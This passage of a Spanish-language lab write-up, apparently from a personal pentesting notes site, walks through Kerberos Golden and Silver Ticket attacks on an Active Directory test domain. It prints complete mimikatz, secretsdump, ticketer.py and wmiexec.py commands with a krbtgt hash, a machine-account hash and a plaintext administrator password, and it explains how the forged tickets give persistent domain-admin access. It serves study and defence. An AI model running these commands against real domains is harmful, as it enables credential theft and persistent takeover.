+<div class="highlight"><pre><span></span><code>.\mimikatz.exe "kerberos::golden /user:jose /domain:domain.com /sid:S-1-5-21-2202691511-3005246676-1411338595 /krbtgt:1ae48c342566ead9aed8411485671910 /groups:512 /ticket:golden.kirbi" "kerberos::ptt golden.kirbi" "exit"
+</code></pre></div>
+<h4 id="que-hace-este-comando-desglose-de-parametros">¿Qué hace este comando? (Desglose de parámetros)<a class="headerlink" href="#que-hace-este-comando-desglose-de-parametros" title="Permanent link">&para;</a></h4>
+<ul>
+<li><code>.\mimikatz.exe</code>: Ejecuta el binario.</li>
+<li><code>"kerberos::golden ..."</code>: Módulo para forjar el ticket:</li>
+<li><code>/user:jose</code>: Nombre del usuario que va en el ticket (puede ser cualquiera, real o ficticio).</li>
+<li><code>/domain:domain.com</code>: Nombre FQDN del dominio.</li>
+<li><code>/sid:S-1-5-21-...</code>: SID del dominio (identifica el dominio a nivel de Windows).</li>
+<li><code>/krbtgt:1ae48...</code>: Hash NTLM de <code>krbtgt</code>, utilizado para <strong>firmar y cifrar</strong> el TGT.</li>
+<li><code>/groups:512</code>: Inyecta el <strong>RID 512 (Domain Admins)</strong> en el PAC del usuario.</li>
+<li><code>/ticket:golden.kirbi</code>: Archivo donde se guarda el ticket generado.</li>
+<li><code>"kerberos::ptt golden.kirbi"</code>: <strong>Pass The Ticket</strong> — Inyecta el archivo <code>.kirbi</code> en la memoria de la sesión actual de LSASS.</li>
+<li><code>"exit"</code>: Cierra Mimikatz limpiamente tras completar la forja e inyección.</li>
+</ul>
+<p><img alt="Forja de Golden Ticket" src="../assets/Pasted%20image%2020261011205215.png" /></p>
+<p>Verificamos que el ticket esté cargado en la memoria de la sesión con <code>klist</code>:</p>
+<div class="highlight"><pre><span></span><code>klist
+</code></pre></div>
+<p><img alt="Verificación klist" src="../assets/Pasted%20image%2020261011205502.png" /></p>
+<hr />
+<h3 id="4-uso-del-golden-ticket-desde-linux">4. Uso del Golden Ticket desde Linux<a class="headerlink" href="#4-uso-del-golden-ticket-desde-linux" title="Permanent link">&para;</a></h3>
+<p>Descargamos el archivo <code>golden.kirbi</code> a nuestra máquina atacante:</p>
+<p><img alt="Ticket en Linux" src="../assets/Pasted%20image%2020261011210646.png" /></p>
+<p>Convertimos el formato <code>.kirbi</code> de Windows a <code>.ccache</code> compatible con Linux usando <strong>ticketConverter.py</strong>:</p>
+<div class="highlight"><pre><span></span><code>ticketConverter.py<span class="w"> </span>golden.kirbi<span class="w"> </span>golden.ccache
+</code></pre></div>
+<p>Exportamos la variable de entorno <code>KRB5CCNAME</code> y ejecutamos comandos remotos con <code>wmiexec.py</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>golden.ccache
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.100.50<span class="w"> </span>SERVIDOR.domain.com
+</code></pre></div>
+<p><img alt="Ejecución con wmiexec" src="../assets/Pasted%20image%2020261011210859.png" /></p>
+<h4 id="por-que-es-tan-util-forjar-un-golden-ticket">¿Por qué es tan útil forjar un Golden Ticket?<a class="headerlink" href="#por-que-es-tan-util-forjar-un-golden-ticket" title="Permanent link">&para;</a></h4>
+<p>Proporciona <strong>persistencia a largo plazo</strong>. Si el administrador del dominio cambia su contraseña mañana, su hash cambiará y perderemos el acceso por Pass-the-Hash. Sin embargo, el Golden Ticket se firma con el hash de <code>krbtgt</code> y puede configurarse con una validez de hasta 10 años, permitiendo reconectarnos en cualquier momento mientras no se renueve dos veces la clave de <code>krbtgt</code>.</p>
+<h4 id="por-que-usar-wmiexecpy-en-lugar-de-evil-winrm">¿Por qué usar <code>wmiexec.py</code> en lugar de <code>evil-winrm</code>?<a class="headerlink" href="#por-que-usar-wmiexecpy-en-lugar-de-evil-winrm" title="Permanent link">&para;</a></h4>
+<ol>
+<li><strong>Independencia de GSSAPI:</strong> <code>evil-winrm</code> depende de las librerías GSSAPI del sistema operativo Linux, las cuales son muy sensibles al uso de mayúsculas/minúsculas en el realm (<code>domain.com</code> vs <code>DOMAIN.COM</code>). Impacket implementa Kerberos de forma nativa en Python, leyendo directamente el archivo <code>.ccache</code>.</li>
+<li><strong>Protocolo:</strong> <code>wmiexec.py</code> opera a través de WMI/RPC (puerto 135 y dinámicos), mientras que <code>evil-winrm</code> usa WinRM (puerto 5985). WMI resulta más tolerante con tickets forjados en entornos de prueba.</li>
+</ol>
+<p><img alt="Persistencia Golden Ticket" src="../assets/Pasted%20image%2020261011215540.png" /></p>
+<hr />
+<h2 id="creacion-de-silver-ticket">Creación de Silver Ticket<a class="headerlink" href="#creacion-de-silver-ticket" title="Permanent link">&para;</a></h2>
+<p>Un <strong>Silver Ticket</strong> es un Ticket de Servicio (TGS) forjado para un servicio específico (SPN) usando la clave de la cuenta de máquina o cuenta de servicio destino, <strong>sin comunicarse con el KDC</strong>.</p>
+<h3 id="1-extraccion-del-hash-de-la-cuenta-de-maquina">1. Extracción del Hash de la Cuenta de Máquina<a class="headerlink" href="#1-extraccion-del-hash-de-la-cuenta-de-maquina" title="Permanent link">&para;</a></h3>
+<p>Volcamos los hashes del dominio con <code>secretsdump.py</code>:</p>
+<div class="highlight"><pre><span></span><code>secretsdump.py<span class="w"> </span>domain.com/Administrator:<span class="s1">'2525j@vik'</span>@192.168.100.50
+</code></pre></div>
+<p><img alt="Volcado secretsdump" src="../assets/Pasted%20image%2020261012031223.png" /></p>
+<p>Localizamos la cuenta de máquina del servidor (<code>SERVIDOR$</code>):</p>
+<div class="highlight"><pre><span></span><code>SERVIDOR$:1000:aad3b435b51404eeaad3b435b51404ee:b91b4182290b30415da504eb777a25a9:::
+</code></pre></div>
+<blockquote>
+<p>[!NOTE]
+<strong>Estructura de RIDs en Windows:</strong>
+- <code>500</code>: Administrator
+- <code>501</code>: Guest
+- <code>502</code>: krbtgt
+- <code>503</code>: DefaultAccount
+- <code>1000</code>: Primera cuenta creada posteriormente (<code>SERVIDOR$</code>).
+- <code>1103</code>: <code>WIN10-01$</code>
+- <code>1104</code>: <code>jose</code></p>
+<p>Windows asigna RIDs secuencialmente a partir de 1000 para cuentas que no son built-in.</p>
+</blockquote>
+<hr />
+<h3 id="2-forja-del-silver-ticket-con-ticketerpy">2. Forja del Silver Ticket con <code>ticketer.py</code><a class="headerlink" href="#2-forja-del-silver-ticket-con-ticketerpy" title="Permanent link">&para;</a></h3>
+<p>Generamos el ticket de servicio para el recurso de archivos CIFS (SMB):</p>
+<div class="highlight"><pre><span></span><code>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>b91b4182290b30415da504eb777a25a9<span class="w"> </span>-domain<span class="w"> </span>domain.com<span class="w"> </span>-domain-sid<span class="w"> </span>S-1-5-21-2202691511-3005246676-1411338595<span class="w"> </span>-spn<span class="w"> </span>CIFS/SERVIDOR.domain.com<span class="w"> </span>jose
+</code></pre></div>
+<h4 id="desglose-del-comando">Desglose del comando:<a class="headerlink" href="#desglose-del-comando" title="Permanent link">&para;</a></h4>
+<ul>
+<li><strong><code>ticketer.py</code></strong>: Utilidad de Impacket para forjar tickets Kerberos (TGT y TGS).</li>
+<li><strong><code>-nthash b91b4182290b30415da504eb777a25a9</code></strong>: Hash NTLM de <strong><code>SERVIDOR$</code></strong> (la cuenta que ejecuta el servicio), <strong>no el de <code>krbtgt</code></strong>. Esta es la diferencia clave respecto al Golden Ticket.</li>
+<li><strong><code>-domain domain.com</code></strong>: Nombre FQDN del dominio.</li>
+<li><strong><code>-domain-sid S-1-5-21-2202691511-3005246676-1411338595</code></strong>: SID del dominio, necesario para construir los SIDs en el PAC.</li>
+<li><strong><code>-spn CIFS/SERVIDOR.domain.com</code></strong>: El <strong>SPN</strong> (Service Principal Name) al que va dirigido el ticket:</li>
+<li><code>CIFS</code>: Protocolo SMB / recursos compartidos.</li>
+<li>Otros SPNs posibles con el mismo hash:<ul>
+<li><code>HTTP/SERVIDOR.domain.com</code> (IIS / Web)</li>
+<li><code>HOST/SERVIDOR.domain.com</code> (WMI / PSRemoting)</li>
+<li><code>MSSQLSvc/SERVIDOR.domain.com</code> (SQL Server)</li>
+<li><code>LDAP/SERVIDOR.domain.com</code> (Consultas LDAP)</li>
+</ul>
+</li>
+<li><strong><code>jose</code></strong>: Usuario indicado en el ticket. A diferencia del Golden Ticket, el KDC <strong>nunca valida este usuario</strong> porque el ticket se entrega directamente al servicio destino.</li>
+</ul>
+<p><img alt="Generación con ticketer.py" src="../assets/Pasted%20image%2020261012031746.png" /></p>
+<hr />
+<h3 id="3-conexion-y-acceso-con-el-silver-ticket">3. Conexión y Acceso con el Silver Ticket<a class="headerlink" href="#3-conexion-y-acceso-con-el-silver-ticket" title="Permanent link">&para;</a></h3>
+<p>Establecemos la variable de entorno para usar el ticket <code>.ccache</code> generado:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>jose.ccache
+</code></pre></div>
+<p>Accedemos mediante <code>wmiexec.py</code>:</p>
+<div class="highlight"><pre><span></span><code>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.100.50<span class="w"> </span>SERVIDOR.domain.com
+</code></pre></div>
+<p><img alt="Conexión wmiexec Silver Ticket" src="../assets/Pasted%20image%2020261012032001.png" /></p>
+<p><img alt="Acceso Confirmado" src="../assets/Pasted%20image%2020261012032201.png" /></p>
+<p>Verificamos la ejecución exitosa del comando como administrador sobre el servidor:</p>
+<p><img alt="Finalización Silver Ticket" src="../assets/Pasted%20image%2020261014235707.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pie" >
+        
+          
+          <a href="../tipos-de-tickets-kerberos/" class="md-footer__link md-footer__link--prev" aria-label="Anterior: 🎫 Tipos de Tickets Kerberos">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Anterior
+              </span>
+              <div class="md-ellipsis">
+                🎫 Tipos de Tickets Kerberos
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../kerberos-ataques/" class="md-footer__link md-footer__link--next" aria-label="Siguiente: 🔥 Ataques Kerberos (AS-REP Roasting)">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Siguiente
+              </span>
+              <div class="md-ellipsis">
+                🔥 Ataques Kerberos (AS-REP Roasting)
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.indexes", "navigation.top", "navigation.instant", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
